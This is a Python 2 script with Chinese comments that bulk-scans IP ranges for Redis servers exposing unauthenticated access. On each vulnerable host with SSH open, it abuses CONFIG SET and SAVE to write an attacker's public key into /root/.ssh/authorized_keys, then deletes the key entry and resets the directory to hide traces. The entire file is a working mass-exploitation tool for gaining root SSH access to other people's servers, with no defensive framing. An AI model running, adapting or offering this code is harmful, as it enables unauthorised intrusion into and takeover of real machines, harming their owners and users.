#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
import os,time
import redis
import time
import socket
import uuid

if len(sys.argv) == 1:
    msg = """
一个Redis未授权访问批量扫描脚本
请确保用于ssh getshell的private_key存在于当前目录下
Usage: Unauthorized.py [begin ip] [end ip] [port default:6379]
Usage: Unauthorized.py --url [url/ip like:www.google.com] [port default:6379]
"""
    print msg
    sys.exit(0)

try: #此模块用来判断用于ssh getshell的private_key是否存在在当前目录下，不存在直接退出程序
     file_key = open('public_key')
     public_key = file_key.read( )
     file_key.close( )
except IOError:
     print 'File is not found or You don\'t have permission to access this file.'
     print 'Please check \'public_key\' ,make sure it\'s on ' + os.path.abspath('.')
     sys.exit(0)

start_Time = time.strftime('%H:%M:%S',time.localtime(time.time()))
IPbegin = sys.argv[1]
IPend = sys.argv[2]
IP1 =  IPbegin.split('.')[0]
IP2 =  IPbegin.split('.')[1]
IP3 =  IPbegin.split('.')[2]
IP4 =  IPbegin.split('.')[-1]
IPend_last = IPend.split('.')[-1]
ohlala = 0 #储存失败的个数
yesyesyes = 0 #储存成功的个数

try:
    redis_port = sys.argv[3]
except IndexError:
    redis_port = 6379
else:
    redis_port = sys.argv[3]

print '[' + start_Time + ']正在尝试Redis未授权访问漏洞'
for i in range(int(IP4)-1,int(IPend_last)):
     ip = str(IP1+'.'+IP2+'.'+IP3+'.'+IP4)
     int_IP4 = int(IP4)
     int_IP4 += 1
     IP4 = str(int_IP4)
     r = redis.StrictRedis(host=ip,port=redis_port,db=0,socket_timeout=0.1) #最后一个参数设置超时用的
     try:
        response = r.client_list()
     except:
        #哈哈哈 是不是很失望
        ohlala = ohlala + 1
     else:
        print '[Redis]' + ip
        yesyesyes = yesyesyes + 1
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            sk.connect((ip,22)) #判断22端口是否开放
            print 'OK!'
            sk.close()
        except Exception:
            print 'not connect!'
        else:
            key = uuid.uuid1() #生成一个随机的key写入
            r.config_set('stop-writes-on-bgsave-error', 'no') #解决持久化问题
            r.set(key, '\n\n' + public_key + '\n\n')
            r.config_set('dir', '/root/.ssh')  #如果redis在非root下运行会抛出异常待完善
            r.config_set('dbfilename', 'authorized_keys')
            r.save()
            r.delete(key)  # 给大佬擦屁屁
            r.config_set('dir', '/tmp')
            time.sleep(2)

print '扫描完毕，成功' + str(yesyesyes) + '个，失败' + str(ohlala) + '个.'
